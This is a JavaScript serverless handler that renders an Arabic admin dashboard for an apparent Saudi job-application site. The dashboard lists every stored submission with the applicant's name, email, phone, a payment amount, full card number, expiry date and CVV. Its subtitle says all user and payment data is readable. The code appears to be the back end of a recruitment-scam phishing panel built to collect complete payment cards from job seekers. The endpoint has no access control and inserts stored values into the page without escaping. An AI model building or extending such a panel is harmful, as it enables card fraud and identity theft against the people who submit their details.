import { list } from '@vercel/blob';

export default async function handler(req, res) {
    try {
        const { blobs } = await list({ prefix: 'submissions/' });
        const submissions = [];
        
        for (const blob of blobs) {
            const response = await fetch(blob.url, {
                headers: {
                    'Authorization': `Bearer ${process.env.BLOB_READ_WRITE_TOKEN}`
                }
            });
            const text = await response.text();
            try {
                submissions.push(JSON.parse(text));
            } catch(e) {
                submissions.push({ error: "Invalid JSON", raw: text });
            }
        }
        
        // ترتيب من الأحدث إلى الأقدم
        submissions.sort((a, b) => b.id - a.id);
        
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(`
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - توظيف السعودية</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a2b3d, #1a4a6e);
            font-family: 'Cairo', 'Segoe UI', system-ui;
            padding: 20px;
            color: #fff;
            direction: rtl;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { text-align: center; color: #ffd32a; margin-bottom: 10px; font-size: 32px; }
        .subtitle { text-align: center; color: #a0aec0; margin-bottom: 30px; }
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 30px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .stat-card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            min-width: 150px;
        }
        .stat-card h3 { color: #a0aec0; font-size: 14px; margin-bottom: 10px; }
        .stat-card .number { color: #ffd32a; font-size: 36px; font-weight: bold; }
        .table-wrapper {
            background: rgba(255,255,255,0.1);
            border-radius: 16px;
            padding: 20px;
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        th, td {
            padding: 12px;
            text-align: center;
            border-bottom: 1px solid rgba(255,255,255,0.2);
        }
        th {
            background: rgba(255,211,42,0.2);
            color: #ffd32a;
            font-weight: bold;
        }
        td { color: #e2e8f0; }
        .empty {
            text-align: center;
            padding: 40px;
            color: #718096;
        }
        .refresh-btn {
            display: inline-block;
            background: #ffd32a;
            color: #1a4a6e;
            padding: 10px 20px;
            border-radius: 8px;
            text-decoration: none;
            margin-bottom: 20px;
            font-weight: bold;
        }
        @media (max-width: 768px) {
            th, td { padding: 8px; font-size: 12px; }
            .stat-card .number { font-size: 24px; }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>📊 لوحة التحكم - توظيف السعودية</h1>
    <p class="subtitle">جميع بيانات المستخدمين والمدفوعات ظاهرة للقراءة</p>
    <a href="/api/get-data" class="refresh-btn">🔄 تحديث</a>
    
    <div class="stats">
        <div class="stat-card">
            <h3>📝 إجمالي الطلبات</h3>
            <div class="number">${submissions.length}</div>
        </div>
        <div class="stat-card">
            <h3>💰 إجمالي المدفوعات</h3>
            <div class="number">${submissions.reduce((sum, s) => sum + (s.amount || 0), 0)} ريال</div>
        </div>
        <div class="stat-card">
            <h3>👥 عدد المستخدمين</h3>
            <div class="number">${new Set(submissions.map(s => s.userEmail)).size}</div>
        </div>
    </div>
    
    <div class="table-wrapper">
        ${submissions.length === 0 ? '<div class="empty">📭 لا توجد طلبات بعد</div>' : `
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>المستخدم</th>
                    <th>الوظيفة</th>
                    <th>الاسم</th>
                    <th>الجوال</th>
                    <th>المبلغ</th>
                    <th>رقم البطاقة</th>
                    <th>تاريخ الانتهاء</th>
                    <th>CVV</th>
                    <th>التاريخ</th>
                </tr>
            </thead>
            <tbody>
                ${submissions.map((s, i) => `
                <tr>
                    <td>${i+1}</td>
                    <td>${s.userEmail || '-'}</td>
                    <td>${s.jobName || '-'}</td>
                    <td>${s.fullName || '-'}</td>
                    <td>${s.phone || '-'}</td>
                    <td>${s.amount || 150} ريال</td>
                    <td>${s.cardNumber || '-'}</td>
                    <td>${s.cardExpiry || '-'}</td>
                    <td>${s.cardCvv || '-'}</td>
                    <td>${new Date(s.time).toLocaleString('ar')}</td>
                </tr>
                `).join('')}
            </tbody>
        </table>
        `}
    </div>
</div>
</body>
</html>
        `);
        
    } catch(error) {
        console.error(error);
        res.status(500).json({ error: error.message });
    }
}